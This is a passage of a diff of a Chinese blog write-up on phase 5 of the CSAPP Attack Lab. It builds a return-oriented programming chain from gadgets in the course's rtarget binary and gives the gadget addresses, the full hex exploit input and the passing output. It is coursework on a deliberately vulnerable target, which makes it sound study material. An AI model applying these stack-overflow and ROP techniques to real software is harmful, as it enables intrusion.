-<p>其把 <code>%rdi</code>  和 <code>%rsi</code>  累加到 <code>%rax</code>  中，那么我们要计算偏移量，需要分别把 <code>%rsp</code>  和偏移量放到 <code>%rsi</code>  和 <code>%rdi</code>  中。最后让 <code>%rdi = rax</code> 。</p>
-<p>在 <code>rtarget</code>  中，与 <code>%rsp</code>  相关的字节有 <code>48 89 e0</code> ，其编码为 <code>movq %rsp,%rax</code> 。和 <code>%esp</code>  相关的字节有 <code>89 e0</code> ，其编码为 <code>movl %esp, %eax</code> 。包含这段编码的代码如下：</p>
+<p>其把<code>%rdi</code>和<code>%rsi</code>累加到<code>%rax</code>中，那么我们要计算偏移量，需要分别把<code>%rsp</code>和偏移量放到<code>%rsi</code>和<code>%rdi</code>中。最后让<code>%rdi = rax</code>。</p>
+<p>在<code>rtarget</code>中，与<code>%rsp</code>相关的字节有<code>48 89 e0</code>，其编码为<code>movq %rsp,%rax</code>。和<code>%esp</code>相关的字节有<code>89 e0</code>，其编码为<code>movl %esp, %eax</code>。包含这段编码的代码如下：</p>
 <pre><code>0000000000401a03 &lt;addval_190&gt;:
   401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax
   401a09:	c3                   	retq
@@ -617,8 +689,8 @@ ec 17 40 00 00 00 00 00
 6. ret
 7. 将攻击字符串放在%rsp + offset 处
 </code></pre>
-<p>我们找一下以 <code>%rsi</code>  和 <code>%rdi</code>  为目的寄存器的指令。</p>
-<p>以 <code>%rdi</code>  为目的寄存器的指令编码有 <code>(48)* 89 (c|d|e|f)(7|f)</code> ，在 <code>rtarget</code>  中可能的代码段如下：</p>
+<p>我们找一下以<code>%rsi</code>和<code>%rdi</code>为目的寄存器的指令。</p>
+<p>以<code>%rdi</code>为目的寄存器的指令编码有<code>(48)* 89 (c|d|e|f)(7|f)</code>，在<code>rtarget</code>中可能的代码段如下：</p>
 <pre><code>00000000004019a0 &lt;addval_273&gt;: // 不可取，c3不是指令
   4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
   4019a6:	c3                   	retq
@@ -631,7 +703,7 @@ ec 17 40 00 00 00 00 00
   4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
   4019c9:	c3                   	retq
 </code></pre>
-<p>以 <code>%rsi/%esi</code>  为目的寄存器的指令编码有 <code>(48)* 89 (c|d|e|f)(6|e)</code> 。在 <code>rtarget</code>  中可能的代码段如下：</p>
+<p>以<code>%rsi/%esi</code>为目的寄存器的指令编码有<code>(48)* 89 (c|d|e|f)(6|e)</code>。在<code>rtarget</code>中可能的代码段如下：</p>
 <pre><code>00000000004019e8 &lt;addval_113&gt;: // 不可取，78 c9不是指令
   4019e8:	8d 87 89 ce 78 c9    	lea    -0x36873177(%rdi),%eax
   4019ee:	c3                   	retq
@@ -648,7 +720,7 @@ ec 17 40 00 00 00 00 00
   401a61:	8d 87 89 ce 92 c3    	lea    -0x3c6d3177(%rdi),%eax
   401a67:	c3                   	retq
 </code></pre>
-<p>这里没有 <code>48</code> ，那么就只能输送到 <code>%esi</code>  中。这里的难点在于如何把偏移量输送到 <code>%esi</code>  中？这里肯定是不能直接输送了，必须通过寄存器的中转。这里只出现了 <code>89 ce</code> ，通过查表我们可以发现 <code>89 ce</code>  对应的指令是 <code>movl %ecx, %esi</code> 。那么我们还需要想办法把值送到 <code>%ecx</code>  中。那么前面的过程就变成了：</p>
+<p>这里没有<code>48</code>，那么就只能输送到<code>%esi</code>中。这里的难点在于如何把偏移量输送到<code>%esi</code>中？这里肯定是不能直接输送了，必须通过寄存器的中转。这里只出现了<code>89 ce</code>，通过查表我们可以发现<code>89 ce</code>对应的指令是<code>movl %ecx, %esi</code>。那么我们还需要想办法把值送到<code>%ecx</code>中。那么前面的过程就变成了：</p>
 <pre><code>1. rax = rsp(48 89 e0)
 2. ecx = 偏移量； rsi = ecx(89 ce)
 3. rdi = rax(&lt;setval_210&gt; 中的 48 89 c7)
@@ -657,7 +729,7 @@ ec 17 40 00 00 00 00 00
 6. ret
 7. 将攻击字符串放在%rsp + offset 处
 </code></pre>
-<p>我们再来探测一下目的寄存器为 <code>%ecx</code>  的相关指令，其格式为 <code>(48)* 89 (c|d|e|f)(1|9)</code> ，包含其格式的代码段为：</p>
+<p>我们再来探测一下目的寄存器为<code>%ecx</code>的相关指令，其格式为<code>(48)* 89 (c|d|e|f)(1|9)</code>，包含其格式的代码段为：</p>
 <pre><code>00000000004019f6 &lt;getval_226&gt;: // 不可取，48 c0不是指令
   4019f6:	b8 89 d1 48 c0       	mov    $0xc048d189,%eax
   4019fb:	c3                   	retq
@@ -671,7 +743,7 @@ ec 17 40 00 00 00 00 00
   401a6e:	c7 07 89 d1 91 c3    	movl   $0xc391d189,(%rdi)
   401a74:	c3                   	retq
 </code></pre>
-<p>代码段中以 <code>%ecx</code>  为目的寄存器的代码格式为 <code>89 d1</code> ，其转化为指令为 <code>movl %edx, %ecx</code> 。</p>
+<p>代码段中以<code>%ecx</code>为目的寄存器的代码格式为<code>89 d1</code>，其转化为指令为<code>movl %edx, %ecx</code>。</p>
 <p>那么前面的过程就变成了：</p>
 <pre><code>1. rax = rsp(48 89 e0)
 2. edx = 偏移量； ecx = edx；(89 d1) rsi = ecx(89 ce)
@@ -681,7 +753,7 @@ ec 17 40 00 00 00 00 00
 6. ret
 7. 将攻击字符串放在%rsp + offset 处
 </code></pre>
-<p>我们再来探测一下目的寄存器为 <code>%edx</code>  的相关指令，其格式为 <code>(48)* 89 (c|d|e|f)(2|a)</code> ，包含其格式的代码段为：</p>
+<p>我们再来探测一下目的寄存器为<code>%edx</code>的相关指令，其格式为<code>(48)* 89 (c|d|e|f)(2|a)</code>，包含其格式的代码段为：</p>
 <pre><code>00000000004019db &lt;getval_481&gt;: // 可以是他！
   4019db:	b8 5c 89 c2 90       	mov    $0x90c2895c,%eax
   4019e0:	c3                   	retq
@@ -701,7 +773,7 @@ ec 17 40 00 00 00 00 00
   401a9e:	8d 87 89 c2 60 d2    	lea    -0x2d9f3d77(%rdi),%eax
   401aa4:	c3                   	retq
 </code></pre>
-<p>代码段中以 <code>%edx</code>  为目的寄存器的代码格式为 <code>89 c2</code> ，其转化为指令为 <code>movl %eax, %edx</code> 。</p>
+<p>代码段中以<code>%edx</code>为目的寄存器的代码格式为<code>89 c2</code>，其转化为指令为<code>movl %eax, %edx</code>。</p>
 <p>那么前面的过程就变成了：</p>
 <pre><code>1. rax = rsp(48 89 e0)
 2. eax = 偏移量；edx = eax；(89 c2) ecx = edx；(89 d1) rsi = ecx(89 ce)
@@ -711,7 +783,7 @@ ec 17 40 00 00 00 00 00
 6. ret
 7. 将攻击字符串放在%rsp + offset 处
 </code></pre>
-<p>以 <code>%eax</code>  (或 <code>%rax</code> ) 为目的寄存器的指令格式为 <code>(48)* 89 (c|d|e|f)(0|8)</code> ，包含其格式的代码段为：</p>
+<p>以<code>%eax</code>(或<code>%rax</code>)为目的寄存器的指令格式为<code>(48)* 89 (c|d|e|f)(0|8)</code>，包含其格式的代码段为：</p>
 <pre><code>0000000000401a03 &lt;addval_190&gt;:
   401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax
   401a09:	c3                   	retq
@@ -737,8 +809,8 @@ ec 17 40 00 00 00 00 00
   401aab:	c7 07 48 89 e0 90    	movl   $0x90e08948,(%rdi)
   401ab1:	c3                   	retq
 </code></pre>
-<p>其中以 <code>%eax</code>  为目的寄存器的代码格式为 <code>89 e0</code> ，其主要目的为 <code>movl %esp,%eax</code> ，也就是我们步骤第一步中的内容。</p>
-<p>除此以外，还有一种涉及 <code>%rax</code>  的指令就是 <code>popq %rax</code> ，其指令编码为 <code>58</code> 。其在代码中出现的部分包含：</p>
+<p>其中以<code>%eax</code>为目的寄存器的代码格式为<code>89 e0</code>，其主要目的为<code>movl %esp,%eax</code>，也就是我们步骤第一步中的内容。</p>
+<p>除此以外，还有一种涉及<code>%rax</code>的指令就是<code>popq %rax</code>，其指令编码为<code>58</code>。其在代码中出现的部分包含：</p>
 <pre><code>00000000004019a7 &lt;addval_219&gt;: // 可以是他！
   4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
   4019ad:	c3                   	retq
@@ -758,7 +830,7 @@ ec 17 40 00 00 00 00 00
 6. ret
 7. 将攻击字符串放在%rsp + offset 处
 </code></pre>
-<p>但是现在问题来了， <code>%rax</code>  既要存储偏移量，又要存储 <code>%rsp</code> ，我们能否换个地方存储 <code>%rsp</code>  呢，其实可以把第 2 步和第 3 步换一下，让 <code>%rax</code>  转储到 <code>%rdi</code>  里去就行。最终步骤如下：</p>
+<p>但是现在问题来了，<code>%rax</code>既要存储偏移量，又要存储<code>%rsp</code>，我们能否换个地方存储<code>%rsp</code>呢，其实可以把第 2 步和第 3 步换一下，让<code>%rax</code>转储到<code>%rdi</code>里去就行。最终步骤如下：</p>
 <pre><code>1. rax = rsp(48 89 e0)
 2. rdi = rax(&lt;setval_210&gt; 中的 48 89 c7)
 3. 偏移量存储在栈上；popq %eax；edx = eax；(89 c2) ecx = edx；(89 d1) rsi = ecx(89 ce)
@@ -767,21 +839,21 @@ ec 17 40 00 00 00 00 00
 6. ret
 7. 将攻击字符串放在%rsp + offset 处
 </code></pre>
-<p>其中 <code>gadget</code>  的地址为：(单独的 gadget 地址见前文)</p>
+<p>其中<code>gadget</code>的地址为：(单独的 gadget 地址见前文)</p>
 <ol>
-<li><code>rax = rsp</code>  -&gt;  <code>401a06</code></li>
-<li><code>rdi = rax</code>  -&gt;  <code>4019c5</code></li>
-<li><code>popq %eax</code>  -&gt;  <code>4019ab</code></li>
+<li><code>rax = rsp</code> -&gt; <code>401a06</code></li>
+<li><code>rdi = rax</code> -&gt; <code>4019c5</code></li>
+<li><code>popq %eax</code> -&gt; <code>4019ab</code></li>
 <li>偏移量存储在栈上</li>
-<li><code>edx = eax</code>  -&gt;  <code>4019dd</code></li>
-<li><code>ecx = edx</code>  -&gt;  <code>401a69</code></li>
-<li><code>rsi = ecx</code>  -&gt;  <code>401a13</code></li>
-<li><code>rax = rdi + rsi</code>  -&gt;  <code>4019d6</code></li>
-<li><code>rdi = rax</code>  -&gt;  <code>4019c5</code></li>
-<li><code>touch3</code>  地址 -&gt;  <code>4018fa</code></li>
+<li><code>edx = eax</code> -&gt; <code>4019dd</code></li>
+<li><code>ecx = edx</code> -&gt; <code>401a69</code></li>
+<li><code>rsi = ecx</code> -&gt; <code>401a13</code></li>
+<li><code>rax = rdi + rsi</code> -&gt; <code>4019d6</code></li>
+<li><code>rdi = rax</code> -&gt; <code>4019c5</code></li>
+<li><code>touch3</code>地址 -&gt; <code>4018fa</code></li>
 </ol>
-<p>因为在执行第一条 <code>rax = rsp</code>  时，已经执行了一次 <code>ret</code>  指令，因此此时 <code>%rsp</code>  在 <code>buf + 48</code>  处，也就是返回地址已经被弹出了一个。所以在 <code>buf + 48</code>  后面是 9 个地址 + 数据，因此偏移量应该是  <code>9 * 8 = 72</code> ，转化为 16 进制就是 <code>0x48</code> 。最终的栈结构如下：</p>
-<p><img data-src="phase5-last.png" alt="phase5-last.png"></p>
+<p>因为在执行第一条<code>rax = rsp</code>时，已经执行了一次<code>ret</code>指令，因此此时<code>%rsp</code>在<code>buf + 48</code>处，也就是返回地址已经被弹出了一个。所以在<code>buf + 48</code>后面是 9 个地址 + 数据，因此偏移量应该是 <code>9 * 8 = 72</code>，转化为 16 进制就是<code>0x48</code>。最终的栈结构如下：</p>
+<p><img data-src="/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Lab/Attack%20lab%20%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/phase5-last.png" alt="phase5-last.png"></p>
 <p>因此，phase 5 的输入为：</p>
 <pre><code>00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
@@ -802,23 +874,30 @@ fa 18 40 00 00 00 00 00
 00
 </code></pre>
 <p>最终结果如下：</p>
-<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>Cookie: 0x59b997fa</pre></td></tr><tr><td data-num="2"></td><td><pre>Type string:Touch3<span class="token operator">!</span>: You called touch3<span class="token punctuation">(</span><span class="token string">"59b997fa"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre>Valid solution <span class="token keyword">for</span> level <span class="token number">3</span> with target rtarget</pre></td></tr><tr><td data-num="4"></td><td><pre>PASS: Would have posted the following:</pre></td></tr><tr><td data-num="5"></td><td><pre>        user <span class="token function">id</span> bovik</pre></td></tr><tr><td data-num="6"></td><td><pre>        course  <span class="token number">15213</span>-f15</pre></td></tr><tr><td data-num="7"></td><td><pre>        lab     attacklab</pre></td></tr><tr><td data-num="8"></td><td><pre>        result  <span class="token number">1</span>:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 06 1A <span class="token number">40</span> 00 00 00 00 00 C5 <span class="token number">19</span> <span class="token number">40</span> 00 00 00 00 00 AB <span class="token number">19</span> <span class="token number">40</span> 00 00 00 00 00 <span class="token number">48</span> 00 00 00 00 00 00 00 DD <span class="token number">19</span> <span class="token number">40</span> 00 00 00 00 00 <span class="token number">69</span> 1A <span class="token number">40</span> 00 00 00 00 00 <span class="token number">13</span> 1A <span class="token number">40</span> 00 00 00 00 00 D6 <span class="token number">19</span> <span class="token number">40</span> 00 00 00 00 00 C5 <span class="token number">19</span> <span class="token number">40</span> 00 00 00 00 00 FA <span class="token number">18</span> <span class="token number">40</span> 00 00 00 00 00 <span class="token number">35</span> <span class="token number">39</span> <span class="token number">62</span> <span class="token number">39</span> <span class="token number">39</span> <span class="token number">37</span> <span class="token number">66</span> <span class="token number">61</span> 00</pre></td></tr></table></figure><p>通过！</p>
-<h2 id="总结"><a class="markdownIt-Anchor" href="#总结">#</a> 总结</h2>
-<ol>
+<pre><code class="bash">Cookie: 0x59b997fa
+Type string:Touch3!: You called touch3(&quot;59b997fa&quot;)
+Valid solution for level 3 with target rtarget
+PASS: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 06 1A 40 00 00 00 00 00 C5 19 40 00 00 00 00 00 AB 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 69 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 C5 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00
+</code></pre>
+<p>通过！</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
 <li>phase 1 很简单，让 buffer overflow 溢出，然后覆盖返回地址即可</li>
-<li>phase 2 需要让 <code>%rdi</code>  的值等于 <code>cookie</code>  的值，我们需要插入一部分自己的攻击代码，比 Phase 1 难度稍微高点</li>
-<li>phase 3 中我们需要插入自己的攻击字符串，然后让 <code>ret</code>  指令返回到攻击代码开始处，通过指令将 <code>%rdi</code>  的值设置为攻击字符串的地址，并且把 <code>touch3</code>  的地址压到栈上。这里的难点在于 <code>hexmatch</code>  和 <code>strncmp</code>  中出现了 <code>push</code>  的压栈操作，并且使用了一段随机的 buffer，如果把攻击字符串放在攻击代码之前，会导致攻击字符串被破坏。因此这里的核心是把攻击字符串放在 caller 函数 ( <code>test</code> ) 的栈空间内（在返回地址下面），然后让 <code>%rdi</code>  指向这里</li>
-<li>phase 4 &amp; phase 5 的难点在于将过程理清楚，并且在 <code>rtarget</code>  中找到对应的 <code>gadget</code> ，将栈上作为 <code>gadget</code>  地址和数值的组合，巧妙地运用 <code>popq</code>  和 <code>ret</code>  和其他指令组合出我们想要的操作。</li>
-<li>phase 5 的核心在于首先确定 <code>rax = rdi + rsi</code> ，并且这两个寄存器一个存储 <code>%rsp</code> ，一个存储偏移量。要将数据输入到这两个寄存器，随后不断的通过反推，找到以他们为目标地址的指令通用结构，在 <code>rtarget</code>  中查找到相关指令，然后确定其源寄存器。再来反推什么指令能将数据输送到源寄存器。打通一条通路，然后确定每个 gadget 的地址，最后串联起来就是我们想要的 gadget 列表！这个过程收获很大！</li>
+<li>phase 2 需要让<code>%rdi</code>的值等于<code>cookie</code>的值，我们需要插入一部分自己的攻击代码，比 Phase 1 难度稍微高点</li>
+<li>phase 3 中我们需要插入自己的攻击字符串，然后让<code>ret</code>指令返回到攻击代码开始处，通过指令将<code>%rdi</code>的值设置为攻击字符串的地址，并且把<code>touch3</code>的地址压到栈上。这里的难点在于<code>hexmatch</code>和<code>strncmp</code>中出现了<code>push</code>的压栈操作，并且使用了一段随机的 buffer，如果把攻击字符串放在攻击代码之前，会导致攻击字符串被破坏。因此这里的核心是把攻击字符串放在 caller 函数(<code>test</code>)的栈空间内（在返回地址下面），然后让<code>%rdi</code>指向这里</li>
+<li>phase 4 &amp; phase 5 的难点在于将过程理清楚，并且在<code>rtarget</code>中找到对应的<code>gadget</code>，将栈上作为<code>gadget</code>地址和数值的组合，巧妙地运用<code>popq</code>和<code>ret</code>和其他指令组合出我们想要的操作。</li>
+<li>phase 5 的核心在于首先确定<code>rax = rdi + rsi</code>，并且这两个寄存器一个存储<code>%rsp</code>，一个存储偏移量。要将数据输入到这两个寄存器，随后不断的通过反推，找到以他们为目标地址的指令通用结构，在<code>rtarget</code>中查找到相关指令，然后确定其源寄存器。再来反推什么指令能将数据输送到源寄存器。打通一条通路，然后确定每个 gadget 的地址，最后串联起来就是我们想要的 gadget 列表！这个过程收获很大！</li>
 </ol>
 <p>虽然做这 5 个 Phase 的过程不容易，但是总体来说受益匪浅！</p>
-<h2 id="参考资料"><a class="markdownIt-Anchor" href="#参考资料">#</a> 参考资料</h2>
-<ul>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
 <li><span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC82MDcyNDk0OA==">CSAPP 实验之 attack lab</span></li>
 <li><span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC80NzYzOTY0NjU=">CSAPP | Lab3-Attack Lab 深入解析</span></li>
 <li><span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC80MTA0MTgwNTM=">csapp-attacklab 详解</span></li>
 </ul>
-</div><footer><div class="meta"><span class="icon"><i class="ic i-eye"></i></span><span>此文章已被阅读次数:</span><span class="waline-pageview-count" id="twikoo_visitors" data-path="2024/02/29/计算机科学/系统/系统入门/15-213/15-213 Lab/Attack lab 实验总结/">正在加载...</span><span class="item"><span class="icon"><i class="ic i-calendar-check"></i></span><span class="text">更新于</span><time title="修改时间：2024-02-29 11:01:05" itemprop="dateModified" datetime="2024-02-29T11:01:05+08:00">2024-02-29</time></span></div><div class="reward"><button><i class="ic i-heartbeat"></i>赞赏</button><p>请我喝[茶]~(￣▽￣)~*</p><div id="qr"><div><img data-src="/blog/assets/wechatpay.png" alt="Salvely 微信支付"/><p>微信支付</p></div><div><img data-src="/blog/assets/alipay.png" alt="Salvely 支付宝"/><p>支付宝</p></div></div></div><div id="copyright"><ul><li class="author"><strong>本文作者：</strong>Salvely<i class="ic i-at"><em>@</em></i>望春风</li><li class="link"><strong>本文链接：</strong><a href="https://salvely.github.io/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Lab/Attack%20lab%20%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/" title="15213 Lab 3-Attack lab 实验记录">https://salvely.github.io/blog/2024/02/29/计算机科学/系统/系统入门/15-213/15-213 Lab/Attack lab 实验总结/</a></li><li class="license"><strong>版权声明：</strong>本站所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/blog/2024/02/26/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Lab/Bomb%20lab%20%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/" rel="prev" itemprop="url" data-background-image="https:&#x2F;&#x2F;i.imgtg.com&#x2F;2023&#x2F;03&#x2F;09&#x2F;YS2LU.jpg" title="15213 Lab 2-Bomb lab 实验记录"><span class="type">上一篇</span><span class="category"><i class="ic i-flag"></i>15-213 Lab</span><h3>15213 Lab 2-Bomb lab 实验记录</h3></a></div><div class="item right"><a href="/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/CSAPP%20%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/Ch1/" rel="next" itemprop="url" data-background-image="https:&#x2F;&#x2F;i.imgtg.com&#x2F;2023&#x2F;03&#x2F;09&#x2F;Y0hOs.jpg" title="CSAPP Chapter 1 - 计算机系统漫游"><span class="type">下一篇</span><span class="category"><i class="ic i-flag"></i>CSAPP 阅读笔记</span><h3>CSAPP Chapter 1 - 计算机系统漫游</h3></a></div></div><div class="wrap" id="wcomments"></div><script type="module" data-pjax="data-pjax">import { init } from 'https://unpkg.com/@waline/client@v2/dist/waline.mjs';
+</div><footer><div class="meta"><span class="icon"><i class="ic i-eye"></i></span><span>此文章已被阅读次数:</span><span class="waline-pageview-count" id="twikoo_visitors" data-path="2024/02/29/计算机科学/系统/系统入门/15-213/15-213 Lab/Attack lab 实验总结/">正在加载...</span><span class="item"><span class="icon"><i class="ic i-calendar-check"></i></span><span class="text">更新于</span><time title="修改时间：2024-02-29 11:01:05" itemprop="dateModified" datetime="2024-02-29T11:01:05+08:00">2024-02-29</time></span></div><div class="reward"><button><i class="ic i-heartbeat"></i>赞赏</button><p>请我喝[茶]~(￣▽￣)~*</p><div id="qr"><div><img data-src="/blog/assets/wechatpay.png" alt="Salvely 微信支付"/><p>微信支付</p></div><div><img data-src="/blog/assets/alipay.png" alt="Salvely 支付宝"/><p>支付宝</p></div></div></div><div id="copyright"><ul><li class="author"><strong>本文作者：</strong>Salvely<i class="ic i-at"><em>@</em></i>望春风</li><li class="link"><strong>本文链接：</strong><a href="https://salvely.github.io/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Lab/Attack%20lab%20%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/" title="15213 Lab 3-Attack lab 实验记录">https://salvely.github.io/blog/2024/02/29/计算机科学/系统/系统入门/15-213/15-213 Lab/Attack lab 实验总结/</a></li><li class="license"><strong>版权声明：</strong>本站所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/blog/2024/02/26/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Lab/Bomb%20lab%20%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/" rel="prev" itemprop="url" data-background-image="https:&#x2F;&#x2F;i.imgtg.com&#x2F;2023&#x2F;03&#x2F;09&#x2F;YSIlc.jpg" title="15213 Lab 2-Bomb lab 实验记录"><span class="type">上一篇</span><span class="category"><i class="ic i-flag"></i>15-213 Lab</span><h3>15213 Lab 2-Bomb lab 实验记录</h3></a></div><div class="item right"><a href="/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/CSAPP%20%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/Ch1/" rel="next" itemprop="url" data-background-image="https:&#x2F;&#x2F;i.imgtg.com&#x2F;2023&#x2F;03&#x2F;09&#x2F;Y0zdB.jpg" title="CSAPP Chapter 1 - 计算机系统漫游"><span class="type">下一篇</span><span class="category"><i class="ic i-flag"></i>CSAPP 阅读笔记</span><h3>CSAPP Chapter 1 - 计算机系统漫游</h3></a></div></div><div class="wrap" id="wcomments"></div><script type="module" data-pjax="data-pjax">import { init } from 'https://unpkg.com/@waline/client@v2/dist/waline.mjs';
 
 setTimeout(function () {
     init({
@@ -835,7 +914,7 @@ setTimeout(function () {
         path: window.location.pathname,
         dark: 'html[data-theme="dark"]'
     });
-}, 1000)</script></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C"><span class="toc-number">1.</span> <span class="toc-text"> 准备工作</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#part-i-code-injection-attack"><span class="toc-number">2.</span> <span class="toc-text"> Part I: Code Injection Attack</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#phase-1%E8%A6%86%E7%9B%96%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80"><span class="toc-number">2.1.</span> <span class="toc-text"> Phase 1：覆盖返回地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#phase-2%E5%9C%A8-buf-%E4%B8%AD%E6%8F%92%E5%85%A5%E6%94%BB%E5%87%BB%E4%BB%A3%E7%A0%81%E5%B9%B6%E8%A6%86%E7%9B%96%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80"><span class="toc-number">2.2.</span> <span class="toc-text"> Phase 2：在 buf 中插入攻击代码并覆盖返回地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#phase-3%E5%9C%A8-buf-%E4%B8%AD%E6%8F%92%E5%85%A5%E6%89%80%E9%9C%80%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%92%8C%E6%94%BB%E5%87%BB%E4%BB%A3%E7%A0%81%E5%B9%B6%E8%A6%86%E7%9B%96%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80"><span class="toc-number">2.3.</span> <span class="toc-text"> Phase 3：在 buf 中插入所需字符串和攻击代码，并覆盖返回地址</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E5%BC%80%E5%A7%8B%E7%9A%84%E9%94%99%E8%AF%AF%E8%A7%A3%E7%AD%94"><span class="toc-number">2.3.1.</span> <span class="toc-text"> 一开始的错误解答</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BF%BD%E7%95%A5%E9%9A%8F%E6%9C%BA%E6%A0%88%E7%A9%BA%E9%97%B4%E7%9A%84%E4%B8%8D%E6%AD%A3%E7%A1%AE%E8%A7%A3%E7%AD%94"><span class="toc-number">2.3.2.</span> <span class="toc-text"> 忽略随机栈空间的不正确解答</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A3%E7%A1%AE%E7%9A%84%E8%A7%A3%E7%AD%94"><span class="toc-number">2.3.3.</span> <span class="toc-text"> 正确的解答</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#part-ii-return-oriented-programming-attack"><span class="toc-number">3.</span> <span class="toc-text"> Part II: Return oriented Programming attack</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#phase-4"><span class="toc-number">3.1.</span> <span class="toc-text"> Phase 4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#phase-5"><span class="toc-number">3.2.</span> <span class="toc-text"> Phase 5</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text"> 总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-number">5.</span> <span class="toc-text"> 参考资料</span></a></li></ol></div><div class="related panel pjax" data-title="系列文章"><ul><li ><a href="/blog/2024/02/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Lab/Data%20lab%20%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/" rel="bookmark" title="15213 Lab 1-data lab 实验记录">15213 Lab 1-data lab 实验记录</a></li><li ><a 